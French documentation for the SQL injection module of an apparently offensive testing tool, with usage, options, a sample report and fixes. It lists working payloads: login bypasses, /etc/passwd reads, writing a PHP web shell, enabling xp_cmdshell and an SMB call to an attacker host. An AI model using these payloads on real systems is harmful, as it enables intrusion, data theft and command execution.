# Module SQLi

Le module SQLi (SQL Injection) de WebHunterX est conçu pour la détection et l'exploitation des vulnérabilités d'injection SQL dans les applications web. Ce module supporte diverses techniques d'exploitation et plusieurs systèmes de gestion de base de données.

## Fonctionnalités principales

- **Multi-DBMS** : Support pour MySQL, PostgreSQL, Oracle, MSSQL et SQLite
- **Détection avancée** : Identification automatique du type de base de données
- **Plusieurs techniques** : Injections basées sur les erreurs, booléennes (aveugles), et temporelles
- **Extraction de données** : Récupération automatisée des tables, colonnes et données
- **Exploitation évoluée** : Exécution de commandes système (selon le DBMS)
- **Évasion de filtres** : Contournement des mécanismes de protection courants

## Types d'injection supportés

WebHunterX détecte et exploite plusieurs types d'injections SQL :

- **Injections basées sur les erreurs** : Extraction d'informations à partir des messages d'erreur
- **Injections booléennes** : Exploitation par inférence sur les réponses true/false
- **Injections temporelles** : Exploitation par inférence sur les délais de réponse
- **Injections UNION** : Extraction directe de données via des clauses UNION
- **Injections de second ordre** : Exploitation des injections stockées et réutilisées

## Utilisation de base

```bash
# Analyse de base d'une URL
python webhunterx.py --module sqli --url "https://exemple.com/page?id=1"

# Ciblage d'un paramètre spécifique
python webhunterx.py --module sqli --url "https://exemple.com/page?id=1" --param id

# Analyse avec authentification
python webhunterx.py --module sqli --url "https://exemple.com/page?id=1" --cookies "PHPSESSID=abc123; auth=xyz789"

# Extraction de données d'une table spécifique
python webhunterx.py --module sqli --url "https://exemple.com/page?id=1" --dump-table users
```

## Options spécifiques

| Option | Description |
|--------|-------------|
| `--param` | Paramètre spécifique à tester |
| `--dbms` | Système de base de données ciblé (mysql, postgres, oracle, mssql, sqlite) |
| `--technique` | Technique d'injection à utiliser (error, blind, time, union) |
| `--level` | Niveau de détection (1-5, 5 étant le plus approfondi) |
| `--risk` | Niveau de risque des payloads (1-3, 3 étant le plus risqué) |
| `--dump-all` | Extraire toutes les données accessibles |
| `--dump-table` | Extraire une table spécifique |
| `--dump-columns` | Extraire des colonnes spécifiques |
| `--prefix` | Préfixe personnalisé pour les payloads |
| `--suffix` | Suffixe personnalisé pour les payloads |

## Techniques avancées

### Empreinte digitale des bases de données

Le module SQLi est capable d'identifier le type et la version du SGBD cible :

```
[+] Détection du système de base de données...
[+] Système détecté : MySQL
[+] Version : 5.7.34
[+] Utilisateur : 'www-data'@'localhost'
[+] Tables accessibles : 14
```

### Contournement d'authentification

WebHunterX peut utiliser des techniques d'injection SQL pour contourner les mécanismes d'authentification :

```sql
' OR 1=1 --
' OR '1'='1
admin' --
```

### Exploitation avancée pour MySQL

Exemples de techniques d'exploitation spécifiques à MySQL :

```sql
-- Lecture de fichiers (si les privilèges le permettent)
SELECT LOAD_FILE('/etc/passwd')

-- Écriture de fichiers (si les privilèges le permettent)
SELECT '<? system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- Exécution de commandes (si disponible)
SELECT sys_exec('id')
```

### Exploitation avancée pour MSSQL

Exemples de techniques d'exploitation spécifiques à MSSQL :

```sql
-- Exécution de commandes via xp_cmdshell
EXEC xp_cmdshell 'whoami'

-- Activation de xp_cmdshell si désactivé
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE

-- Pivotage sur le réseau interne
EXEC xp_dirtree '\\attacker-smb-server\share'
```

## Exemple de rapport

Le module SQLi génère des rapports détaillés dans différents formats :

```json
{
  "timestamp": "2023-06-30T15:45:12",
  "target": "https://exemple.com/page?id=1",
  "vulnerabilities": [
    {
      "type": "SQL_INJECTION",
      "parameter": "id",
      "method": "GET",
      "dbms": "mysql",
      "technique": "error_based",
      "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '1'='1",
      "proof": "Duplicate entry '5.7.341' for key 'group_key'",
      "severity": "high",
      "tables_found": ["users", "products", "orders"],
      "columns_found": {
        "users": ["id", "username", "password", "email", "role"]
      },
      "data_sample": {
        "users": [
          {"id": "1", "username": "admin", "password": "5f4dcc3b5aa765d61d8327deb882cf99", "email": "admin@exemple.com", "role": "administrator"}
        ]
      },
      "remediation": "Utiliser des requêtes préparées avec des paramètres liés"
    }
  ],
  "scan_details": {
    "params_tested": 3,
    "payloads_sent": 47,
    "scan_duration": "00:03:18",
    "dbms_details": {
      "type": "MySQL",
      "version": "5.7.34",
      "user": "www-data@localhost",
      "current_db": "app_db"
    }
  }
}
```

## Architecture interne

Le module SQLi est composé de plusieurs sous-composants spécialisés :

1. **Détecteur d'injection** : Identifie les points vulnérables aux injections SQL
2. **Analyseur DBMS** : Détermine le type et la version du système de base de données
3. **Moteur d'exploitation** : Exploite les vulnérabilités en utilisant diverses techniques
4. **Extracteur de données** : Récupère les schémas, tables, colonnes et données
5. **Générateur de payloads** : Crée des payloads adaptés au DBMS ciblé
6. **Générateur de rapports** : Produit des rapports détaillés sur les vulnérabilités

## Payloads par DBMS

Le module inclut des payloads spécifiques pour chaque système de base de données supporté.

### MySQL

```sql
-- Détection par erreur
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION()),0x7e)) AND '
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '

-- Détection par temps
' AND IF(VERSION() LIKE '5%', SLEEP(3), 0) AND '

-- Énumération de tables
' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() -- 
```

### PostgreSQL

```sql
-- Détection par erreur
' AND (SELECT current_database()) IS NOT NULL AND '
' AND CAST((SELECT version()) as int) AND '

-- Détection par temps
' AND (SELECT pg_sleep(3)) AND '

-- Énumération de tables
' UNION SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public' -- 
```

### Oracle

```sql
-- Détection par erreur
' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) AND '

-- Détection par temps
' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) AND '

-- Énumération de tables
' UNION SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables -- 
```

## Bonnes pratiques de correction

Le rapport inclut des recommandations de correction spécifiques :

- Utilisation de requêtes préparées avec des paramètres liés
- Application du principe du moindre privilège pour les utilisateurs de base de données
- Validation stricte des entrées utilisateur
- Utilisation d'ORM sécurisés (comme SQLAlchemy, Hibernate)
- Configuration appropriée des messages d'erreur

## Intégration avec d'autres modules

Le module SQLi peut être utilisé en conjonction avec d'autres modules de WebHunterX :

- **Module de crawling** : Pour découvrir automatiquement les points d'injection
- **Module d'authentification** : Pour tester les zones protégées
- **Module de contournement de WAF** : Pour éviter les protections spécifiques aux injections SQL

## Références

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Guide de sécurité des bases de données MySQL](https://dev.mysql.com/doc/refman/8.0/en/security.html)
- [Guide de sécurité PostgreSQL](https://www.postgresql.org/docs/current/security.html) 